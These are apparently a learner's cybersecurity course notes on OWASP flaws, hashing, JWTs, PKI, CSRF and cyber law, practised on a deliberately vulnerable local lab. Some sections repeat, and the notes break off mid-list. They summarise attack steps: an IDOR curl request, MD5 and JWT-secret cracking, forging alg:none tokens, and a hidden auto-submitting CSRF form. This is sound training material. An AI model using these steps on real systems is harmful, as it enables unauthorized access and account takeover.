## 12.31 OWASP Top 10 (Deep Dive) — Phase B DONE ✅

Went deep into the OWASP Top 10. Exploited Broken Access Control (A01) on pos-lab.
Saw the fix in code.

### The OWASP Top 10 (2021) — full list
- A01: Broken Access Control (the #1 most dangerous)
- A02: Cryptographic Failures
- A03: Injection
- A04: Insecure Design
- A05: Security Misconfiguration
- A06: Vulnerable and Outdated Components
- A07: Identification and Authentication Failures
- A08: Software and Data Integrity Failures
- A09: Security Logging and Monitoring Failures
- A10: Server-Side Request Forgery (SSRF)

### The A01 deep dive (Broken Access Control)
- The #1 most dangerous vulnerability globally.
- Two types:
  - Vertical: access admin features as a normal user.
  - Horizontal (IDOR): access another user's data (e.g., user 5 accessing user 1).
- Real-world: Parler 2021 (70TB leaked via sequential IDs), First American 2019 (885M records).
- The fix: check `if (req.user.id !== requestedId && req.user.role !== 'admin') return 403`.
- Pos-lab: `canSeeUser()` check is skipped in vulnerable mode.

### The A02 deep dive (Cryptographic Failures)
- Weak or missing cryptography.
- Example: MD5 passwords, no HTTPS, hardcoded secrets.
- Real-world: Adobe 2013 (150M records, 3DES-ECB mode).
- The fix: scrypt/bcrypt/argon2, TLS 1.3, env vars for secrets.

### The A03 deep dive (Injection)
- Input becomes code.
- Types: SQLi, XSS, Command Injection, NoSQL Injection, LDAP Injection.
- Real-world: TalkTalk 2015 (157K customers, £400K fine).
- The fix: parameterized queries, output encoding, input validation.

### Real commands I ran
- `curl -s -c seller_cookies.txt -X POST http://127.0.0.1:3001/api/auth/login ...`
- `curl -s -b seller_cookies.txt http://127.0.0.1:3001/api/users/1`
- `sed -n '65,85p' ~/pos-lab/routes/users.js`

### Things I saw
- Logged in as seller (id: 3).
- Requested user id 1 (boss).
- Got the boss's full profile (name, email, role).
- The code shows the fix: `if (!canSeeUser(req.user, row)) return 403`.

### My own words (locked in)
- Broken Access Control is the #1 most dangerous vulnerability.
- It's hard to protect with automated tools because the request looks normal.
- The fix is 3 lines of code: check ownership.
- IDOR (changing the ID in the URL) is the most common form.
- A01 is the #1 cause of massive data breaches (Parler, First American).
- WAFs can't stop A01 because the request is legitimate.
- Testing: log in as a low-privilege user, change the ID, see if it works.

### Connection to other topics
- 8.2 (OWASP overview) — the list.
- 12.13 (Vuln assessment) — finding the bugs.
- 12.15 (Web hacking) — exploiting them.
- 12.14 (Exploitation) — the full attack chain.
- 8.10 (Secure API) — the fix (BOLA check).
- 12.33 (API Security) — deeper API-specific OWASP.,# 🔐 PART 12 — CYBERSECURITY & ETHICAL HACKING

Notes for Phase 2 — started 2026-10-09

====================================================
Module 1 — Security Foundations
====================================================

## 12.1 What is Cybersecurity?

- Cybersecurity = protecting computers, networks, and data from attacks
- 3 parts: Protect, Detect, Respond
- CIA Triad (the foundation):
  * Confidentiality — only authorized users can access data
  * Integrity — data stays accurate and unmodified
  * Availability — data accessible when needed
- Threat actors: script kiddies, cybercriminals, hacktivists, nation-states, insiders, competitors

## 12.2 CIA Triad (deep dive)

- Confidentiality = keeps data secret (encryption, access control)
- Integrity = keeps data correct (hashing, signatures)
- Availability = keeps data accessible (backups, redundancy)
- Real attacks mapped:
  * Phishing → Confidentiality
  * Ransomware → Integrity + Availability
  * DDoS → Availability
  * SQL Injection → Confidentiality + Integrity
  * MITM → Confidentiality + Integrity
  * Insider theft → Confidentiality
  * Disk failure → Availability
- Built: cia_analyzer.py (classifies attacks by CIA pillar)

## 12.3 Threat Actors & Attack Types

### 6 Threat Actors
1. Script Kiddie  - Fun, low skill, random targets
2. Cybercriminal  - Money, organized, high threat (⭐⭐⭐⭐)
3. Hacktivist     - Ideology, medium threat (⭐⭐)
4. Nation-State   - Espionage, elite, max threat (⭐⭐⭐⭐⭐)
5. Insider        - Revenge/money, hardest to detect
6. Competitor     - Business advantage

### 5 Attack Vectors
1. Phishing          - tricking humans
2. Malware           - malicious software
3. Social Engineering - psychological manipulation
4. Exploits          - attacking vulnerabilities
5. Physical          - direct access

### Key terms
- Threat Actor = WHO attacks
- Attack Vector = HOW they attack
- APT = Advanced Persistent Threat

### Real examples
- Lazarus Group (North Korea) - 15+ years, $3B stolen
- LockBit - major ransomware gang
- Anonymous - hacktivist collective

### My own words
- Threat actor = who performs hack
- Attack vector = what they use to attack
- Nation-states have highest sophistication
- Insiders hardest to detect (legitimate access)
- Attribution is HARD (false flags exist)

### Built: profiler.py
Classifies attackers based on clues/indicators.
## 12.4 Attack Surface & Vectors

### Attack Surface
- Total sum of all ways an attacker could break in
- Bigger surface = more opportunities to attack
- 4 types:
  * Network  - open ports, exposed services
  * Software - code, libraries, OS
  * Human    - employees, users
  * Physical - devices, buildings

### Attack Surface vs Attack Vector
- Surface = ALL possible ways in
- Vector  = the ONE way actually used

### How to reduce attack surface
- Close unused ports
- Remove unused software
- Disable unused accounts
- Patch regularly
- Use firewalls
- Train employees

### Golden rule
"If you don't need it, turn it off."

### Why smaller is safer
Fewer ways in = easier to defend. Attackers need only ONE gap.

### Built: surface_mapper.py
Scans a target for open ports, classifies risk level.
Special host for practice: scanme.nmap.org
## 12.5 Security Mindset

### What it is
Habitually thinking about how systems can be broken.
Not "how does this work?" but "how can this break?"

### Two mindsets
- Normal: "Does it work?"
- Security: "Does it work ONLY as intended?"

### 6 principles
1. Think like an attacker
2. Trust nothing, verify everything
3. Assume breach
4. Defense in depth
5. Principle of least privilege
6. Fail securely

### Attacker's 5 questions
1. How would I break in?
2. What would I steal?
3. What would I change?
4. What would I destroy?
5. What would I hide?

### Weird things radar (signs of attack)
- Logins at odd hours
- Many failed attempts
- Large data transfers at midnight
- Port scans on your server

### Layers of attack
Data → Access control → Login → Network → Server → Physical → Human
Attackers attack the weakest layer.

### My own words
- Security mindset = thinking like a thief
- Don't assume, test/verify
- Always notice possible entry points
- Cyber café analysis:
  * Attack surface = network + 11 PCs + physical
  * Highest value = admin PC (customer data)
  * Weakest layer = untrained guard

### Real quote
"Security is a process, not a product." — Bruce Schneier
### 12.18 Social Engineering — Phase B DONE ✅

Analyzed a fake Safaricom/M-Pesa SMS. Identified attack type,
emotion, red flags, and safe version.

### Core concepts
- Social Engineering = hacking the HUMAN, not the machine
- Types: phishing, spear phishing, vishing, smishing, pretexting,
  baiting, tailgating, quid pro quo
- Attackers exploit: urgency, fear, authority, helpfulness, greed
- Defense: slow down, verify, never share PIN/password

### Real analysis I did
- Fake Safaricom SMS asking for PIN via *106*123#
- Caught: fear + urgency, fake USSD, PIN request, fake number

### My own words (locked in)
- Safaricom never hurries someone — urgency is a scam tell
- The target isn't the system — it's the person with the keys
- No real company asks for your PIN or password, ever
- Fear + urgency = the classic one-two punch
## 12.6 Cryptography Basics — Phase B DONE ✅

Ran MD5 cracker against pos-lab DB. Cracked 3 passwords.
Flipped to scrypt. Same cracker → 0 cracks.

### Core concepts
- Cryptography = securing info so only intended readers can access
- Plaintext  = readable message
- Ciphertext = scrambled version
- Key        = the secret that locks/unlocks
- Encrypt    = plaintext → ciphertext
- Decrypt    = ciphertext → plaintext
- Symmetric  = one key (fast, hard to share)
- Asymmetric = two keys, public + private (slow, solves sharing)

### Encryption vs Hashing
- Encryption = REVERSIBLE (with the key)
- Hashing    = ONE-WAY (cannot reverse)
- Encryption = for sending secrets
- Hashing    = for storing passwords / verifying integrity

### Real commands I ran
- node tests/crack-md5.js --all      → cracked 3 passwords in 10 ms
- sed -i 's/SECURE_MODE=.*/SECURE_MODE=true/' .env
- node db/init.js                     → rebuilt DB with scrypt
- node tests/crack-md5.js --all      → 0 cracks

### Things I saw
- MD5 mode: boss123, manager123, seller123 all CRACKED in <10 ms each
- scrypt mode: all three "not applicable" — dictionary attack fails
- Only change: SECURE_MODE=true in .env, then rebuild DB
- Hashing code in db/init.js: hashMd5() vs hashScrypt()
- scrypt adds randomBytes(16) salt → unique hash per user

### The four-line proof
1. Cracked 3 passwords from MD5
2. Flipped SECURE_MODE=true
3. Rebuilt DB with scrypt
4. Same cracker → 0 cracks

### My own words (locked in)
- Encryption = 2-way (encrypt + decrypt with key)
- Hashing = 1-way (cannot reverse)
- scrypt is SLOW ON PURPOSE — every guess costs ~100 ms
- MD5 is FAST — great for checksums, terrible for passwords
- Salt = random data added before hashing
  → same password produces different hashes each time
  → kills rainbow tables and cross-user comparisons
- The algorithm IS the security. Not the code around it. Just the math.
- You can flip a whole app from vulnerable to secure by changing
  how ONE function works.
## 12.6 Cryptography Basics — Phase B DONE ✅

Cracked MD5 hashes with pos-lab's cracker. Flipped to scrypt. Same
cracker → 0 cracks.

### Core concepts
- Cryptography = securing info so only intended readers can access
- Plaintext  = readable message
- Ciphertext = scrambled version
- Key        = the secret that locks/unlocks
- Encrypt    = plaintext → ciphertext
- Decrypt    = ciphertext → plaintext
- Symmetric  = one key (fast, hard to share)
- Asymmetric = two keys, public + private (slow, solves sharing)

### Encryption vs Hashing
- Encryption = REVERSIBLE (with key) — for sending secrets
- Hashing    = ONE-WAY (cannot reverse) — for storing passwords
- Cracking ≠ reversing. Cracking = guessing + verifying.
- John the Ripper guesses passwords, hashes each, compares to target.
- Target hash is fixed. Guesses change. Match = crack.

### Salts explained
- Without salt (MD5): same password → same hash for all users
  → crack once → unlock thousands
- With salt (scrypt): each user gets unique random salt
  → same password → different hash per user
  → John must crack each individually
  → rainbow tables useless
- The salt is stored IN the hash (not secret)
- John reads the salt from the target, uses it for each guess
- Salt's job: make each hash unique + defeat precomputed tables

### Real commands I ran
- node tests/crack-md5.js --all  → cracked 3 passwords in 10 ms
- sed -i 's/SECURE_MODE=.*/SECURE_MODE=true/' .env
- node db/init.js                 → rebuild DB with scrypt
- node tests/crack-md5.js --all  → 0 cracks

### Things I saw
- MD5 mode: boss123, manager123, seller123 all CRACKED in <10 ms
- scrypt mode: all three "not applicable" — dictionary attack fails
- Hashing code in db/init.js:
    hashMd5() uses createHash('md5'), no salt
    hashScrypt() uses randomBytes(16) salt + scryptSync
    hashPassword() dispatches: isSecure() ? scrypt : md5
- Only change needed: SECURE_MODE=true + rebuild DB

### My own words (locked in)
- Encryption = 2-way. Hashing = 1-way.
- Crack = guess + hash + compare. Never "reverse the hash."
- John the Ripper doesn't unhash. It guesses passwords, hashes them,
  compares to the target. Match = found.
- Cracking works because humans choose predictable passwords
  (words, names, patterns, dates). Random passwords don't get cracked.
- Salt = random data added before hashing → same password produces
  different hashes per user → kills rainbow tables → forces individual cracking
- scrypt is slow on purpose (~100 ms per guess). That's the whole point.
- MD5 is fast — great for checksums, terrible for passwords
- The algorithm IS the security. Code around it doesn't matter.
- Nothing is "unhackable." Everything is "expensive enough."
- "John is dangerous" = it's OFFLINE (silent, no detection, no rate limit).
  Hydra is ONLINE (loud, logged, blocked).
## 12.7 Symmetric vs Asymmetric Encryption — Phase B DONE ✅

Cracked an HS256 JWT secret. Tested forged alg:none tokens.
Verified RS256 can't be cracked with a wordlist.

### Core concepts
- Symmetric   = 1 shared key (fast, key sharing hard)
  Example: HS256 with 'secret', AES
- Asymmetric  = 2 keys (public + private)
  Example: RS256 with RSA keypair
  Public key = shareable, verifies
  Private key = secret, signs
- HS256 signs AND verifies with the same secret
  → every verifier can also forge
  → breaks down when multiple services verify
- RS256 signs with private, verifies with public
  → verification does not leak forging power
  → safe even if the public key is published

### Attacks demonstrated on pos-lab
1. AUTH-06: alg:none — attacker sends a JWT with alg:none
   → server accepts it → forged token
   → (vuln mode only)
2. AUTH-02: HS256 weak secret
   → 'secret' cracked in 9.51 ms → forge any token
3. Secure (RS256) — same cracker → ❌ not found

### Real commands I ran
- curl POST /api/auth/login → extract pos_token from Set-Cookie
- node tests/crack-jwt.js "<jwt>" → crack the HS256 secret
- echo -n '{"alg":"none"...}' | base64 → forge alg:none token
- curl -b "pos_token=$FORGED" /api/auth/me → hit API as boss

### Things I saw
- Vuln HS256 token: {"alg":"HS256"} → secret 'secret' cracked in 9.51 ms
- Secure RS256 token: {"alg":"RS256"} → ❌ not found in 19 candidates
- Forged alg:none token → server accepted it → became boss
  (in vuln mode; blocked in secure mode)
- pos-lab switches between HS256 and RS256 by SECURE_MODE

### My own words (locked in)
- HS256 = one shared secret → works for one server, breaks for many
- RS256 = private key signs, public key verifies → forgery requires
  the private key, which never leaves the server
- Modern crypto uses BOTH: asymmetric exchanges a key,
  symmetric encrypts the bulk
- A weak secret breaks even a strong algorithm
- JWT algorithm must be enforced by the server, not read from the token
  (that's the alg-confusion bug, AUTH-03)
- "Verify" without forgery power is the whole point of asymmetric crypto
## 12.8 Hashing (MD5, SHA, bcrypt) — Phase B DONE ✅

Compared MD5 vs scrypt in pos-lab. Cracked MD5 in 12 ms.
Cracker failed on scrypt.

### Core concepts
- Hashing = one-way function. Input → fixed-size fingerprint.
- Properties:
  - Deterministic: same input → same hash
  - One-way: cannot reverse
  - Avalanche: 1 byte change → totally different hash
  - Fixed size: output is always the same length

### Hash algorithms
- MD5 (128 bits)  — BROKEN. Fast. Do not use for passwords.
- SHA-1 (160 bits) — BROKEN (2017, "SHAttered").
- SHA-256 (256 bits) — Secure for checksums. Fast.
- SHA-512 (512 bits) — Same, larger output.
- bcrypt — Slow by design. Good for passwords.
- scrypt — Slow + memory-hard. Better.
- argon2 — Best (2026 standard).

### Two uses, different algorithms
1. Integrity checksums (did the file change?)
   - Fast hash OK: MD5, SHA-256
   - Public info, no secret
2. Password storage (verify without storing)
   - Must be SLOW: scrypt, bcrypt, argon2
   - Secret — never share
   - Fast hash = fatal (attackers try billions/sec)

### Anatomy of a scrypt hash
  scrypt$9bd82df4cb4a5cfc77acbb2872ec0f79$c01caaf63d4dea25...
         └────────── salt ──────────┘ └────── hash ──────┘
  Three parts: prefix (algorithm) + salt + hash

### Real commands I ran
- echo -n "hello" | md5sum
- echo -n "hello" | sha256sum
- echo -n "hello" | sha512sum
- node tests/crack-md5.js --all
- sed -i 's/SECURE_MODE=.../' .env
- node db/init.js
- sqlite3 db/pos.db "SELECT username, password_hash FROM users"

### Things I saw
- md5("hello") twice → identical (5d41402abc4b2a76b9719d911017c592)
- md5("hellO")    → completely different (06612c0d9c73d47a7042afd7024d7c82)
- Output lengths: MD5=32, SHA-256=64, SHA-512=128 hex chars
- VULN mode (MD5): 3 passwords cracked in 12 ms total
- SECURE mode (scrypt): 0 cracked, dictionary attack "not applicable"
- MD5 hash format: md5$<32hex>
- scrypt hash format: scrypt$<salt32hex>$<hash128hex>
- Three users in same DB → each got a DIFFERENT salt
  (so same password would produce different hashes)

### My own words (locked in)
- Hashing ≠ encryption. One-way. Cannot be unhashed.
- Same input → same hash (deterministic)
- One-byte change → totally different hash (avalanche)
- MD5 is broken for passwords. Fast = attacker's best friend.
- scrypt is slow ON PURPOSE. That's its security.
- Salt = random data per user → same password = different hash per user
- The salt is stored IN the hash (prefixed).
- Fast hashes are fine for checksums; fatal for passwords.
- Different algorithms for different requirements.
## 12.37 Cyber Laws — Phase B DONE ✅

Learned Kenya's Computer Misuse and Cybercrimes Act (2018).
Understood authorization = the line between legal and criminal.

### Core concepts
- Cyber law = laws governing computers, networks, digital behavior
- The ONE test: authorization
  - Own it → ✅ legal
  - Signed permission → ✅ legal
  - Neither → ❌ cybercrime
- Authorized access = explicit, in writing (contract, bug bounty, scope doc)
- Exceeding authorized access = having SOME permission but going beyond it
- "For education" is NOT a legal defense
- "It was public" is NOT a legal defense
- "For a good cause" is NOT a legal defense

### Kenya's Computer Misuse and Cybercrimes Act, 2018
- § 3  Unauthorized access → KSh 3M fine or 2 years prison
- § 4  Unauthorized access + intent to commit crime → 5 years
- § 5  Unauthorized interference with data → 5 years
- § 6  Unauthorized interference with a system → 5 years
- § 7  Unauthorized disclosure of data → 3 years
- § 14 Cyber harassment → 10 years
- § 16 Identity theft → 10 years
- § 22 Failure to report a cybercrime → 5 years

### Same concept worldwide
- US — Computer Fraud and Abuse Act (CFAA), 1986
- UK — Computer Misuse Act, 1990
- Nigeria — Cybercrimes Act, 2015
- South Africa — Cybercrimes Act, 2020
- International — Budapest Convention, 2001

### The legal pentest setup
1. Signed contract (or accepted bug bounty policy)
2. Defined scope (which URLs/IPs)
3. Time window
4. Exclusions
5. Emergency contact
6. Liability limits

### Real commands I ran
- cat ~/pos-lab/README.md
- grep -i "legal\|authoriz\|permission" ~/pos-lab/docs/*.md

### Things I saw
- pos-lab says: "Built for training" → my permission to attack it
- Docs use "authorization" in code sense (CWE-639, BOLA, etc.)
- But that's not the same as LEGAL authorization

### My own words (locked in)
- The ONE difference between pentester and cybercriminal = written permission
- Own it or get signed permission. Stay in scope. Don't cause harm.
- "Friend said yes" is weaker than a signed contract
- Even for friends, get it in writing
- Bug bounty platforms exist because companies sometimes sue good-faith
  researchers. Pre-negotiated legal terms protect BOTH sides.
- If in doubt → ask first. Or don't touch.
- It was "mine" → legal to crack pos-lab
- It was "someone else's" → crime in every country
- Cyber law is more complex than technical security — get a lawyer
  if you're doing it professionally
## 12.38 Ethical Hacking Legal Framework — Phase B DONE ✅

Wrote a real Rules of Engagement for pos-lab. Understood the full
legal paperwork stack.

### The five documents before any pentest
1. Authorization letter — permission from an officer
2. Scope document — what you can test
3. NDA — keep everything confidential
4. Rules of Engagement (RoE) — how you test
5. Insurance / liability agreement — who pays if it breaks

Plus: proposal/contract (the business relationship)

### What each protects
- Authorization → your legal right to test
- Scope → what you touch (limits)
- NDA → the company's secrets
- RoE → how you do it (timing, methods, emergency contact)
- Insurance → liability if something breaks

### The five ethical principles
1. Authorization — always have written permission
2. Scope — never go outside agreed limits
3. No harm — don't break things on purpose
4. Confidentiality — never leak findings
5. Responsible disclosure — report to owner first, not public

### Responsible disclosure — the 90-day rule
1. Find bug → report privately
2. Give ~90 days to fix
3. Coordinate disclosure
4. Publish after fix (with permission)
5. If ignored 90 days → may disclose publicly (legal risks vary)

Popularized by Google Project Zero.

### My own words (locked in)
- The technique is the same for pentester and criminal.
  The paperwork is what makes it legal.
- Five documents: authorization, scope, NDA, RoE, insurance
- RoE is the "how" — timing, methods, emergency, exclusions
- Responsible disclosure: private first, public only after fix
- 90 days is the industry standard, not a law
- "Friend said yes" < signed authorization
- Even for friends, even for your own systems — write it down
- Self-owned = no third-party authorization needed (but document it)
- "For education" is not a legal defense. Authorization is.

### Real commands I ran
- cat ~/pos-lab/README.md
- nano ~/master/PRACTICALS/12-cybersecurity/12.38-legal-framework/pos-lab-ROE.md

### Things I saw
- pos-lab README explicitly says "intentionally vulnerable by design,
  built for training" — that's its authorization statement
- I wrote a full RoE for pos-lab
- The document names tester, owner, scope, timing, exclusions,
  reporting, liability, emergency contact, signature

### Compare — real-world incidents
- Kevin Mitnick: 5 years prison (1990s hacking)
- Became a paid security consultant using the SAME techniques
- Difference: paperwork, permission, signed contracts
- Bug bounty hunters sometimes get threatened/sued even for
  good-faith reporting — that's why platforms like HackerOne exist
  (pre-negotiated legal terms)
## 12.38 Ethical Hacking Legal Framework — Phase B DONE ✅

Wrote a real Rules of Engagement for pos-lab. Created a full
template pack for future engagements.

### The five documents before any pentest
1. Authorization letter — signed permission from an officer
2. Scope document — what you can test
3. NDA — keep everything confidential
4. Rules of Engagement (RoE) — how you test
5. Insurance / liability agreement — who pays if it breaks

### What each protects
- Authorization → your legal right to test
- Scope → what you touch (limits)
- NDA → the company's secrets
- RoE → how you do it (timing, methods, emergency)
- Insurance → liability if something breaks

### The five ethical principles
1. Authorization — always have written permission
2. Scope — never go outside agreed limits
3. No harm — don't break things on purpose
4. Confidentiality — never leak findings
5. Responsible disclosure — report to owner first, not public

### Responsible disclosure — the 90-day rule
1. Find bug → report privately
2. Give ~90 days to fix
3. Coordinate disclosure
4. Publish after fix (with permission)
5. If ignored 90 days → may disclose publicly (legal risks vary)

### Files I created (in ~/master/PRACTICALS/12-cybersecurity/12.38-legal-framework/)
- pos-lab-ROE.md — working RoE for this lab
- templates/01-authorization-letter.md
- templates/02-scope-document.md
- templates/03-nda.md
- templates/04-rules-of-engagement.md
- templates/05-liability-agreement.md

### All committed to GitHub
Commit: 701fb2b "12.38: five legal framework templates"
All 6 files confirmed via git ls-files.

### Real commands I ran
- git add -A
- git commit -m "12.38: five legal framework templates"
- git push origin main
- git ls-files | grep "12.38"

### Things I saw
- 5 templates + pos-lab-ROE all tracked in git
- Committed to origin/main successfully
- Templates are reusable for any future engagement

### My own words (locked in)
- The technique is the same for pentester and criminal.
  The paperwork is what makes it legal.
- Five documents: authorization, scope, NDA, RoE, insurance
- RoE is the "how" — timing, methods, emergency, exclusions
- Responsible disclosure: private first, public only after fix
- 90 days is the industry standard, not a law
- "Friend said yes" < signed authorization
- Even for friends, even for your own systems — write it down
- Self-owned = no third-party authorization needed (but document it)
- "For education" is not a legal defense. Authorization is.
- I now have a REUSABLE legal template pack for any future job
## 12.39 Compliance (ISO 27001, PCI-DSS) — Phase B DONE ✅

Read pos-lab's COMPLIANCE.md: 37 vulnerabilities mapped to
PCI-DSS, HIPAA, SOC 2, GDPR.

### The 4 major frameworks
| Framework | Protects | Who needs it | Penalty |
|-----------|----------|--------------|---------|
| PCI-DSS | Credit card data | Anyone touching card data | $5K-$100K/month, lost card privileges |
| HIPAA | Health data | US healthcare | $100-$50K per violation |
| GDPR | EU personal data | Anyone with EU users | Up to 4% global revenue or €20M |
| SOC 2 | Service controls | SaaS, cloud providers | No fine (customers demand it) |
| ISO 27001 | Info security program | Any org (voluntary) | No fine (customers demand it) |

### What pos-lab taught me
- COMPLIANCE.md maps every vulnerability to compliance failures
- One vuln = multiple framework failures
  - AUTH-01 (MD5) → PCI-DSS 3.5 + HIPAA 312(d) + SOC 2 CC6.1 + GDPR Art.32
  - PROD-01 (SQLi) → PCI-DSS 6.2 + HIPAA 312(c) + SOC 2 CC6.1 + GDPR Art.32
- Secure mode of pos-lab = "compliance-shaped" (every control satisfied)
- Vuln mode = every framework fails

### The most important sentence
"Compliance ≠ security. You can pass every audit and still get breached."
- Compliance is a FLOOR, not a CEILING
- Audit = checklist (may be outdated)
- Secure = actual practice
- Passing audit + getting breached = common (Equifax, Target, etc.)

### Real commands I ran
- cat ~/pos-lab/docs/COMPLIANCE.md

### Things I saw
- 4 frameworks mapped (PCI-DSS v4.0, HIPAA Security Rule, SOC 2, GDPR)
- 37 lab vulnerabilities × 4 frameworks = huge cross-reference table
- Every vuln fails at least one framework
- The doc ends with references to all 4 official sources

### My own words (locked in)
- Compliance = the business side of security
- PCI-DSS = credit cards (Visa/Mastercard enforce it)
- HIPAA = US health data (HHS enforces it)
- GDPR = EU personal data (up to 4% global revenue fine)
- SOC 2 = trust controls (no law, but customers demand it)
- ISO 27001 = info security program (voluntary, market-driven)
- One vulnerability can fail multiple compliance requirements
- Compliance ≠ security. It's a floor.
- Audits prove PROCESS, not perfect code
- Real post-breach reports: "we passed audit, but had an IDOR"
- Compliance + attack skills = professional-ready

### The compliance map (from the doc)
- Every vuln in the lab maps to specific compliance requirements
- Example: SQLi (PROD-01) violates 4 frameworks simultaneously
- This is the business impact of every vulnerability you exploit
- A pentester who can say "this fails PCI-DSS 6.2" wins the CTO's attention
## 12.9 Digital Signatures & Certificates — Phase B DONE ✅

Signed a real message with a real RSA private key.
Verified with the public key. Tampered. Verification failed.

### The 4 steps I ran
1. Key check → jwt-private.pem + jwt-public.pem exist
2. Message → "Hello from Felix"
3. Sign with private key → message.sig (256 bytes)
4. Verify with public key → "Verified OK"
5. Tamper message → "Hello from HACKER"
6. Verify again → "Verification failure: bad signature"

### What a digital signature proves
- ✅ Authenticity — came from the private key holder
- ✅ Integrity — hasn't changed since signing
- ✅ Non-repudiation — signer can't deny it
- ❌ NOT confidentiality — anyone can read the message

### Core concepts
- Signature ≠ encryption. Signature proves, encryption hides.
- Sign = hash(message) + private key → signature
- Verify = hash(message) + public key → compare to signature
- Change one character of the message → hash changes → signature fails
- Only the private key can create a valid signature
- Only the matching public key can verify it

### Real commands I ran
- ls -la ~/pos-lab/keys/
- echo "Hello from Felix" > message.txt
- openssl dgst -sha256 -sign ~/pos-lab/keys/jwt-private.pem -out ~/message.sig ~/message.txt
- openssl dgst -sha256 -verify ~/pos-lab/keys/jwt-public.pem -signature ~/message.sig ~/message.txt
  → Verified OK
- echo "Hello from HACKER" > message.txt
- openssl dgst -sha256 -verify ~/pos-lab/keys/jwt-public.pem -signature ~/message.sig ~/message.txt
  → Verification failure: bad signature

### Things I saw
- Signature file = 256 bytes (2048-bit RSA signature)
- Before tamper: "Verified OK"
- After tamper:  "Verification failure" + rsa bad signature error
- The signature stayed the same. The message changed. Verification caught it.

### My own words (locked in)
- A signature proves the message is from the key holder AND unchanged
- It does NOT hide the message
- Only the private key can sign. Only the public key can verify.
- One character change = verification fails
- Signing is like a wax seal: proves who sent it, proves it wasn't broken
- Digital signature = hash + private key
- Digital verification = hash + public key + compare
- This is how HTTPS, JWT, PDFs, Bitcoin, software updates all work
- Signature guarantees: authenticity, integrity, non-repudiation
- Signature does NOT guarantee: confidentiality (that's encryption's job)
- The tamper test is the ultimate proof of how signatures work
- Real-world: "Verified OK" = trust. "Verification failure" = do not trust.

### Real-world use of digital signatures
- HTTPS/TLS: certificates signed by CAs
- JWT: payload signed by the server
- PDF: documents signed by Adobe or self-signed
- Bitcoin: every transaction signed by the sender
- Software updates: vendor signs the installer
- Email: DKIM signs the message
- Git commits: can be GPG-signed
- The entire web of trust runs on signatures
## 12.10 Public Key Infrastructure (PKI) — Phase B DONE ✅

Traced the certificate chain for google.com.
Understood how trust flows from Root → Intermediate → Leaf.

### The problem PKI solves
How does your browser trust a random server it's never seen?
Any server can claim "I am google.com". PKI is the trust system.

### The chain of trust (3 levels)
1. ROOT CA (pre-installed in OS/browser)
   - Example: GTS Root R4, DigiCert Global Root, ISRG Root X1
   - Private key is sacred (offline, in an HSM)
   - Signs intermediates
2. INTERMEDIATE CA (online)
   - Example: Google Trust Services WE2, DigiCert TLS RSA 2020
   - Signed by root
   - Signs leaf certificates
3. LEAF CERTIFICATE (the website's cert)
   - Example: *.google.com
   - Contains: subject, public key, issuer, validity, signature
   - Signed by intermediate

### Why intermediates exist
- Root private key is too valuable to expose online
- Intermediates do the daily signing
- If an intermediate is compromised → revoke only it
- Root stays safe

### The trust store
- Every device has a list of trusted Root CAs (~150)
- Pre-installed by OS/browser (Android, Chrome, Firefox, Windows, macOS)
- If a root is in the list → certs it signs are trusted
- If not → "not private" red warning

### Certificate revocation
- CRL (Certificate Revocation List) — old, slow
- OCSP (Online Certificate Status Protocol) — real-time
- If a CA is compromised → browsers remove it entirely

### Real commands I ran
- openssl s_client -connect google.com:443 -servername google.com </dev/null 2>/dev/null | grep -E "^ [0-9] s:"

### Things I saw
- 3 levels in the chain
- Leaf: CN=*.google.com
- Intermediate: C=US, O=Google Trust Services, CN=WE2
- Root: C=US, O=Google Trust Services LLC, CN=GTS Root R4
- Google is their own Certificate Authority

### My own words (locked in)
- PKI = the system of certs + authorities that creates trust on the internet
- Chain of trust: Root → Intermediate → Leaf
- Root CA is trusted because it's in the OS/browser trust store
- Intermediates exist so the Root key stays offline (safer)
- If any link in the chain fails → browser shows warning
- Google has its own Root CA (GTS Root R4) and its own intermediate
- Small sites buy from Let's Encrypt, DigiCert, etc.
- If you create your own Root CA → browsers show red warning
  (because it's not in their trust store)
- Corporate IT installs their own Root CA on work laptops
  → can intercept HTTPS (that's how "corporate spying" works)
- Certificate revocation: CRL (old), OCSP (new)
- Entire CAs can be removed from browser trust stores if compromised

### Real-world incident
- Symantec 2017: issued fake certs for google.com and other domains
- Google distrusted all Symantec certs in Chrome
- Cost Symantec ~$3 billion
- Sold its CA business to DigiCert
- One CA failure = billions lost
- The whole system depends on trust. Lose it = lose everything.

### Connection to earlier topics
- 12.7 (asymmetric) — keys are the foundation
- 12.9 (signatures) — certs are signed
- 7.5 (domain/DNS/HTTPS) — certs enable HTTPS
- 8.3 (HTTPS/TLS/Certificates) — same concepts, deeper
- 12.10 (PKI) — the trust system that ties them together
## 12.15 (Part 2) — CSRF — Phase B DONE ✅

Attempted a CSRF attack using pos-lab's evil.html.
The attack was blocked by modern browser defenses.

### The attack
- evil.html is a fake "You won a prize!" page.
- It contains a hidden <form> that auto-submits to /api/sales.
- It was designed to create a sale in the victim's name.
- I fixed the port, opened the page, waited 3 seconds.
- The database remained empty (the attack was blocked).

### Why it was blocked
1. SameSite Cookies: the browser refused to send the session cookie
   on a cross-site request.
2. Modern browser protections: block cross-origin form submissions
   that would cause state changes without CORS permission.

### How CSRF works (concept)
- The victim is logged into site A (pos-lab).
- The attacker hosts site B (evil.com).
- Site B makes a request to site A.
- The browser automatically attaches site A's cookie.
- Site A thinks the victim made the request.

### How to fix CSRF (defenses)
1. CSRF Tokens: server gives a secret token. Forms must include it.
   The attacker cannot read it (Same-Origin Policy).
2. SameSite Cookies: tells the browser not to send the cookie
   on cross-site requests.
3. Origin/Referer checks: reject requests from other domains.

### The three major web attacks — summary
- SQL Injection: input becomes SQL. Fix: parameterized queries (?).
- XSS: input becomes HTML/JS. Fix: textContent, escape HTML.
- CSRF: attacker tricks the browser into making a request.
  Fix: CSRF tokens + SameSite cookies.

### My own words (locked in)
- CSRF = tricking the victim's browser into sending a request
  they didn't intend to send.
- It relies on the browser auto-sending cookies.
- It is blocked by SameSite cookies (modern default).
- It is also blocked by CSRF tokens.
- The attack requires the victim to be logged in.
- If the cookie is HttpOnly and SameSite=Strict, CSRF is very hard.
- The pos-lab evil.html attack was stopped by the browser,
  not by pos-lab's code (we were in vulnerable mode).
- Modern browsers are the first line of defense against CSRF.

### The 3 attacks in one sentence
- SQLi = inject code into database
- XSS = inject code into browser
- CSRF = trick the browser into sending requests

## 12.17 Password Attacks — Phase B DONE ✅

Ran a real password cracking attack on pos-lab.
Cracked MD5 hashes in 9 ms. Scrypt blocked it.

### The 9 types of password attacks
1. Brute Force — try every combination (slow)
